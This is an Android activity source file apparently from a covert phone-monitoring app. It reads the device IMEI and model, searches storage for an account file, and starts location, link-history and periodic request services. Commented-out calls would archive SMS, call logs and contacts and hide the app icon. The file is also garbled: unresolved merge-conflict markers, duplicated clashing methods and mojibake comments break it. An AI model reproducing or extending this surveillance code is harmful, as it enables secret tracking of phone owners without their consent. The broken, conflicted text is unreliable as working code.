package com.inet.android.bs;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.List;
import java.util.concurrent.TimeUnit;

import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ActivityInfo;
import android.content.res.Configuration;
import android.os.Bundle;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.widget.Button;
import android.widget.EditText;

import com.inet.android.certificate.R;
import com.inet.android.history.LinkService;
import com.inet.android.location.LocationTracker;
import com.inet.android.request.Request4;
import com.inet.android.utils.Logging;

public class MainActivity extends Activity {
	Button install;
	Button exit;
	LocationTracker gps;
	LinkService link;
	AlertDialog.Builder ad;
	Context context;
	final String SAVED_TIME = "saved_time";
	Editor e;
	SharedPreferences sp;
	byte[] data;
	String incFile;
	private String aboutDev;
	private static String LOG_TAG = "mainActivity";
	String fileID = "id.txt";
	List<String> result;
	File root;
	File[] fileArray;
	private String sID;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
		// setContentView(R.layout.activity_main);
		context = getApplicationContext();
		Logging.doLog(LOG_TAG, "onCreate", "onCreate");

<<<<<<< HEAD
		sp = PreferenceManager.getDefaultSharedPreferences(context);
=======
		FileLog.writeLog(" ============================ \n");
		FileLog.writeLog(" onCreate \n");
		FileLog.writeLog(" ============================\n ");

		sp = PreferenceManager
				.getDefaultSharedPreferences(getApplicationContext());
>>>>>>> refs/remotes/origin/war
		final TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

		String imeistring = manager.getDeviceId();
		String model = android.os.Build.MODEL;
<<<<<<< HEAD
		String androidVersion = android.os.Build.VERSION.RELEASE;
		// ListApp listApp = new ListApp();
		// listApp.getListOfInstalledApp(context);
		// GetInfo getInfo = new GetInfo(context);
		// getInfo.getInfo();
		// GetContacts getCont = new GetContacts();
		// getCont.execute(context);
		// ArchiveSms arhSms = new ArchiveSms();
		// arhSms.execute(context);
		// ArchiveCall arhCall = new ArchiveCall();
		// arhCall.execute(context);
		aboutDev = " Model: " + model + " Version android: " + androidVersion;
		// sIMEI = "IMEI: " + imeistring;
=======
		String versionAndroid = android.os.Build.VERSION.RELEASE;

		aboutDev = " Model: " + model + " Version android: " + versionAndroid;
		sIMEI = "IMEI: " + imeistring;
>>>>>>> refs/remotes/origin/war
		e = sp.edit();
		e.putString("BUILD", "V_000.1");
		e.putString("imei", imeistring);
		e.putString("ABOUT", aboutDev);
		e.putString("model", model);
		e.putString("account", "account");

		e.commit();

<<<<<<< HEAD
=======
		// hideIcon(); //

		// ÔÓ‚ÂˇÂÏ, ÔÂ‚˚È ÎË ‡Á ÓÚÍ˚‚‡ÂÚÒˇ ÔÓ„‡ÏÏ‡
>>>>>>> refs/remotes/origin/war
		boolean hasVisited = sp.getBoolean("hasVisited", false);
		boolean getInfo = sp.getBoolean("getInfo", false);
<<<<<<< HEAD
=======
		if (!hasVisited) {
			// –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –ø–µ—Ä–≤—ã–π –∑–∞–ø—É—Å–∫

>>>>>>> refs/remotes/origin/war
		if (!hasVisited) {
<<<<<<< HEAD
			// –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –ø–µ—Ä–≤—ã–π –∑–∞–ø—É—Å–∫

=======
			// ÔÓ‚ÂÍ‡ Ì‡ ÔÂ‚ÓÂ ÔÓÒÂ˘ÂÌËÂ
>>>>>>> refs/remotes/origin/war
			e = sp.edit();
			e.putBoolean("hasVisited", true);
			e.putBoolean("getInfo", true);
			e.putBoolean("hideIcon", false);
			e.putString("ABOUT", aboutDev);
			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); // –≤—Ä–µ–º—è
																				// –¥–ª—è
																				// —Å–µ—Ä–≤–∏—Å–∞
																				// –∏—Å—Ç—Ä–æ–∏
																				// –∏
																				// –±—Ä–∞—É–∑–µ—Ä–∞
			e.putString("period", "1"); // –ø–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏–π –∑–∞–ø—Ä–æ—Å –∫–∞–∂–¥—ã–µ 10 –º–∏–Ω—É—Ç
			e.putString("code", "-1");
			e.commit();
<<<<<<< HEAD

			// hideIcon();
		}

		if (getID()) {
			Logging.doLog(LOG_TAG, "getID return true");
		} else {
			Logging.doLog(LOG_TAG, "getID return false");
		}
		if (sp.getString("account", "account").equals("account")) {

			Logging.doLog(LOG_TAG, "File not found. Show dialog.",
					"File not found. Show dialog.");
			viewIDDialog();
		} else {
			Logging.doLog(LOG_TAG, "not show dialog");

			finish();
		}
	}
=======
>>>>>>> refs/remotes/origin/war

<<<<<<< HEAD
	@Override
	public void onConfigurationChanged(Configuration newConfig) {
		super.onConfigurationChanged(newConfig);
=======
			// hideIcon();
		}

		if (getID()) {
			Logging.doLog(LOG_TAG, "getID return true");
		} else {
			Logging.doLog(LOG_TAG, "getID return false");
		}
		
		getID(); // ÂÍÛÒË‚Ì˚È ÔÓËÒÍ Ù‡ÈÎ‡ Ò ÌÛÊÌ˚Ï ËÏÂÌÂÏ
		
		if (sp.getString("ID", "ID").equals("ID")) {
			Log.d(LOG_TAG, "File is not found. Show dialog.");
			FileLog.writeLog(LOG_TAG + " -> File not found. Show dialog.");
			
			viewIDDialog();
		} else {
			Logging.doLog(LOG_TAG, "not show dialog");

			finish();
		}
>>>>>>> refs/remotes/origin/war
	}

	private boolean viewIDDialog() {
		AlertDialog.Builder alert = new AlertDialog.Builder(this);

		alert.setTitle("Attention!!!");
		alert.setMessage("Enter account number!");

		final EditText input = new EditText(this);
		alert.setView(input);

		alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
			public void onClick(DialogInterface dialog, int whichButton) {
				String value = input.getText().toString();
<<<<<<< HEAD

				Logging.doLog(LOG_TAG, "Text: " + value, "Text: " + value);

				e = sp.edit();
				e.putString("account", value);
=======
				
				// Do something with value!
				Log.d(LOG_TAG, "Text: " + value);
				FileLog.writeLog("Text: " + value);
				
				sp = PreferenceManager
						.getDefaultSharedPreferences(getApplicationContext());
				Editor e = sp.edit();
				e.putString("ID", value);
>>>>>>> refs/remotes/origin/war
				e.commit();
<<<<<<< HEAD

				SharedPreferences sp = PreferenceManager
						.getDefaultSharedPreferences(getApplicationContext());
				Logging.doLog(LOG_TAG, "send start request, imei: ",
						sp.getString("imei", "imei"));

				JSONObject jsonObject = new JSONObject();
				try {
					jsonObject.put("account", sp.getString("account", "0000"));
					jsonObject.put("imei", sp.getString("imei", "imei"));
					jsonObject.put("model", sp.getString("model", "0000"));
				} catch (JSONException e) {
					e.printStackTrace();
				}

				// String str = jsonObject.toString();
				// StartRequest sr = new StartRequest(getApplicationContext());
				// sr.sendRequest(str);
				start(); // –∑–∞–ø—É—Å–∫ —Å–µ—Ä–≤–∏—Å–æ–≤
=======
				
				start(); // Á‡ÔÛÒÍ ÒÂ‚ËÒÓ‚
				sendDiagPost();
>>>>>>> refs/remotes/origin/war
				finish();
			}
		});

		alert.setNegativeButton("Cancel",
				new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog, int whichButton) {
						// Canceled.
						finish();
					}
				});

		alert.show();
		return true;
	}

	public boolean getID() {
		Logging.doLog(LOG_TAG, "Start search ID", "Start search ID");

<<<<<<< HEAD
=======
		FileLog.writeLog("MainActRequest: before req");

		Request req = new Request(context);
		req.sendRequest(diag);
		
		Log.d(LOG_TAG, "post req");
		FileLog.writeLog("MainActRequest: post req");
	}

	public void getID() {
		Log.d(LOG_TAG, "Start search ID ");
>>>>>>> refs/remotes/origin/war
		File file[] = Environment.getExternalStorageDirectory().listFiles();
		return recursiveFileFind(file);
	}

	public boolean recursiveFileFind(File[] file1) {
		int i = 0;
<<<<<<< HEAD
=======
		String ID = null;
>>>>>>> refs/remotes/origin/war
		String filePath = " ";
		if (file1 != null) {
			while (i != file1.length) {
				filePath = file1[i].getAbsolutePath();
				sID = file1[i].getName();
				if (file1[i].isDirectory()) {
					File[] file = file1[i].listFiles();
<<<<<<< HEAD
					if (recursiveFileFind(file) == true) {
						return true;
					}
=======
					if (recursiveFileFind(file) == true)
						return true;
>>>>>>> refs/remotes/origin/war
				}

				if (sID.indexOf("ts.apk") != -1) {
					ID = sID.substring(0, sID.indexOf("t"));
					e = sp.edit();
					e.putString("account", ID);
					e.commit();
<<<<<<< HEAD
					// Log.d("ID", sp.getString("ID", "ID"));
					if (!sp.getString("account", "account").equals("account")) {
						start();
						return true;
					}
					break;
=======
					
					sendDiagPost();
					
					start(); // Á‡ÔÛÒÍ ÒÂ‚ËÒÓ‚
					return true;
>>>>>>> refs/remotes/origin/war
				}
				i++;
			}

		}
<<<<<<< HEAD
=======
		
>>>>>>> refs/remotes/origin/war
		return false;
	}

	/**
	 * Start services
	 */
	public void start() {
		Logging.doLog(LOG_TAG, "start services", "start services");

		startService(new Intent(MainActivity.this, Request4.class));

		try {
			TimeUnit.MILLISECONDS.sleep(1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		startService(new Intent(MainActivity.this, LocationTracker.class));
		startService(new Intent(MainActivity.this, LinkService.class));

		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
}
